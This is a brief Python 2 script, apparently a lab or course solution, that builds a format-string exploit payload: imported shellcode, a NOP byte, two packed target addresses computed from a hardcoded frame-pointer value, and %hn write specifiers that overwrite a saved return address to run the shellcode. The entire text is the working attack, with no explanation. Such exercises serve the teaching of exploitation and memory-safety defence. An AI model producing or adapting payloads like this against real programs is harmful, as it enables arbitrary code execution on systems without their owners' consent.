from shellcode import shellcode


from struct import pack


ebp = 0xbffed388


print shellcode+ "\x90" + pack("<I",ebp+6) + pack("<I",ebp+4) + "%49118x%10$hn%2946x%11$hn"

